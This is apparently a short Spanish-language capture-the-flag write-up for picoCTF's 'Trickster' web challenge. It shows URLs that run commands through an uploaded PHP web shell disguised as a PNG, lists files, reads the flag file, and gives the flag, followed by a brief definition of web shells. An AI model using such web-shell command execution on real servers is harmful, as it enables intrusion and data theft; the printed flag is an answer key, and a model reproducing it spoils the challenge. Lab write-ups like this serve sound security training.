### Trickster

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:60436/)
### Solución 
Para listar los archivos en el servidor se pone la liga
http://atlas.picoctf.net:50065/uploads/myshell.png.php?cmd=ls

luego se pone http://atlas.picoctf.net:50065/uploads/myshell.png.php?cmd=ls ..
ahi sale el archivo de texto que contiene la bandera, solo se obtiene  con cat

http://atlas.picoctf.net:50065/uploads/myshell.png.php?cmd=cat%20../MFRDAZLDMUYDG.txt
```
PNG/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03} */
```

picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}
### Notas
**webshell** es un script malicioso (generalmente escrito en PHP, ASP, Python o Perl) subido a un servidor web para obtener acceso remoto y control total sobre el mismo. Actúa como una puerta trasera (backdoor) que permite a los atacantes ejecutar comandos, robar datos, instalar malware o persistir en la red.
los archivos se suelen guardar en enlace/uploads/archivo